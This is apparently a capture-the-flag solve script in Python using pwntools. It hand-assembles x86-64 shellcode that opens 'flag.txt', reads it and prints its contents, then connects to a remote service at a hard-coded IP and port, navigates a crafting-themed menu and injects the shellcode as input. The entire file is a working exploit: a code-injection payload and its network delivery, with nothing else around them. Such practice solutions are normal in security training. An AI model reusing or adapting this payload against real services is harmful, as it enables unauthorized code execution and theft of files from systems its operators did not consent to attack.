#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

shellcode = bytes([
    # --- OPEN("flag.txt") ---
    0x31, 0xc0,                               # xor eax, eax
    0x50,                                     # push rax (null)
    0x48, 0xb8,                               # movabs rax, "flag.txt"
    0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x74,
    0x50,                                     # push rax
    0x54,                                     # push rsp
    0x5f,                                     # pop rdi
    0x31, 0xf6,                               # xor esi, esi
    0x31, 0xc0,                               # xor eax, eax
    0xb0, 0x02,                               # mov al, 2
    0x0f, 0x05,                               # syscall

    # --- READ ---
    0x97,                                     # xchg edi, eax
    0x48, 0x83, 0xec, 0x50,                   # sub rsp, 80
    0x54,                                     # push rsp
    0x5e,                                     # pop rsi
    0x6a, 0x50,                               # push 80
    0x5a,                                     # pop rdx
    0x31, 0xc0,                               # xor eax, eax
    0x0f, 0x05,                               # syscall

    # --- WRITE ---
    0x92,                                     # xchg edx, eax
    0x6a, 0x01,                               # push 1
    0x5f,                                     # pop rdi
    0x31, 0xc0,                               # xor eax, eax
    0xb0, 0x01,                               # mov al, 1
    0x0f, 0x05,                               # syscall

    # --- EXIT ---
    0x31, 0xff,                               # xor edi, edi
    0x31, 0xc0,                               # xor eax, eax
    0xb0, 0x3c,                               # mov al, 60
    0x0f, 0x05,                               # syscall
])

p = remote('83.136.253.144', 41488)

p.recvuntil(b'materials!')
p.sendline(b'1')

p.recvuntil(b'craft?')
p.sendline(b'2')

p.recvuntil(b'weapon?')
p.send(shellcode)

print(p.recvall(timeout=3).decode(errors='ignore'))
